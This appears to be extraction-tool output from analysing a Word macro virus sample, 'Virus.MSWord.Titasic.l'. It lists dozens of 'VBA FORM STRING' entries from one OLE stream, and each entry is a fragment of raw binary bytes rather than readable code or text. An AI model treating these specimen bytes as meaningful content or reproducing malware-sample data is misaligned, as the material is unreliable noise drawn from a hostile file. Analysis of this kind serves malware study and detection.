- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@'?kA[�Me�i����͠��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0n 8x"<~&?�-H�0K�9P�8R�2M�1M�0L�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`,K�6T�2N�)M�$B�-L�Ff�`}�3N�.J�!7u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*Z;U�B\�Ga�Kc�D^�L_�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1d,=^
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2^(>q
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M$=m@X�f|����"Y$7q
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(_,`
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8t'@}'>�2J�8O�9N�=O�3E�3H�4I�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^"<~7U�4S�#>�+H�Db�`|�t��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<i��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'W1I{-Iy8Lv:Hj
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7i =n!;i(8a
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7j2J|Zk�#6j
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!U'a
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2o'@}(?�4I�:N�<N�9L�->,C�+B~
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)l=Z�@^�&A�*H�B`�^����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4l <w ;r
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5g'Ao7R�"?q2N�1Iz7Ku%5Y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:l 9i(8a
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C$Y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.c/DyNa�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'a 0k
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6m"9u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4r!9y":z2F�7I�;P�.E�&;~";�#;|$9|
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*m-H�Sq� >�&F�?`�p�Ǩ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9k=\�-Ex)@p���6Q�-Hz/H}+Iy3Kv"/Y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5g%5]
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&Z'a
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1c&[
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*a$<nF\�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/d$3l
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/h)C~
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9y(B�4I�7P�*B�!7| ;y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3s&<}
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X
"i";�Hc�%B�)G�Rp���斳�y�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,]���"=m1K~6O�4M�0J|5Ix&6^
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7k&6^
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2g#Z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'\+>tTd�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/d%3o
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C2D|'<x
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4u+F�4L�8Q�&<}
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3s%:}$8~
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.s8P�Ka�?Y�x�Ž�����<T�k��z��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&X2K�1M�6O�8N�1M�4O�,Fs
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3h!4g'4]
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"] 5jOc�+<p
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)]+8o
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3$<n*=r
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4p)C}3K�+>$4v
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6t*@�#;|
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.o.F�v��Um�������	%T
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5g(@u8O�;T�;V�8R�5Q�3N�3M�.Fy+Ex.Hv)Bm.Fr
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)\ =n
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5g(6^
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
- 9b
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U 7nCV�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

<(;n#0g
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
._+<w
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,i*;v*=y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.mAV�!7u*@�+?}-:~4F�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(i7R���ޖ�����o��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:l%Ap/Hz:U�9U�<X�8U�3R�5Q�4N�2Q�+Hz&Ew$Br&Av"@o
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5g*8a
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"_7H�"4l
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)_"4l
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)d#.j$1i
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&b7L�":z5N�,B�#6wCW�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Un����������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4h#=q-H}5Q�<X�:X�6U�8U�3T�6U�0O�-M�0L�.K|)Ey"Au
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=s ;r
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5l 5i)6a
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(c$:y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T"7x8M�I`�$={:M�Vi�ez����������$Cp
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=s+I}6U�;X�@\�>\�=\�<[�8W�8W�5R�/S�2N�-J�*F|+D{"?x
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6m!7j+5a
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/m$8u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3r8N�cy�Ng�i��h��Lg���������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;l%E{0P�=\�<]�@\�B]�@\�@\�=[�8W�4T�3P�2L�1L�/H~)Ey$Aw"=t
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5o!8h,7b
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6p&:y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4u0M�Wt����n�ǅ�׊��Ok�������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7i%Cw4N�:V�?^�?a�=_�Gc�Bb�Ed�Bb�B]�=V�6R�5S�3Q�.K�-H~(B}$Aw
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7k)9b
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7j8O�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'i$`
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1j 9v/G�b~����q�Ǎ�ߔ�ᇡ����!=j'Iz,J~4T�5U�>[�Aa�Db�Dg�Bg�@f�Bg�>c�7\�4V�4U�0S�,O�*J�&F|'E{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7k 8k):`
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)n 1r!5v
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0m	!\
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+h ?y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.e$:r+Bw3I����Zs�w�Ǉ�Ӡ�������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)[/M�4R�9V�<Y�=^�Aa�Fj�Hl�Jp�Jt�Js�Gm�@a�9]�,W�,S�)R�-N�,L�)G}"Bv"Au
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:i)8\
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0q$5t
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1n	*f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Z
#\	 U
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&^!:l/BuCU�v�����8O�i����ɮ�����Fa�'Fy5T�5V�<]�=_�:b�Bg�Bn�Qs�T{�V��W��P{�Jp�Bf�3[�0Z�*U�,Q�.O�,K|#Eu Bs =n
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:i$8Z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,i,<~ 1q
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6w#?
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7s&d
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'b9N~t�����������%BzZu���������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<i6O�9U�:W�=[�;^�Bg�Fk�Rw�X�_��b��d��b��X��Lw�<f�2`�0Y�/U�-R�-N�$Hy#Et
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=j(<Z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ^0C5F�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>} D� G�'N�+O�"E�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+d=L�ft����������?S�<Y�Gh�n�Ƣ�����^~�1T�2Q�0W�6\�=b�=b�Ej�Lv�[��`��i��p��w��t��u��f��S��Dx�:i�7`�6X�/Q�,N#Gx
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@q >k#8W
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(1?oBR�M]�)<w
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)_)i
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�+N�0R�5Y�/Q�6N�bv���ը��������Tl�8U�Gg�e����߻�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Cr(O�.X�5\�7b�;e�?h�Mw�V��a��m��~�ԃ�ی�݈�ۅ��|��k��\��P��Do�9a�1X�-R�)N|
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Cs#?l$<Z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#[8Ew
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5s!;|%?-H�4P�;\�Qo���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Titasic.l' - OLE stream: 'Macros/TITASIC/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
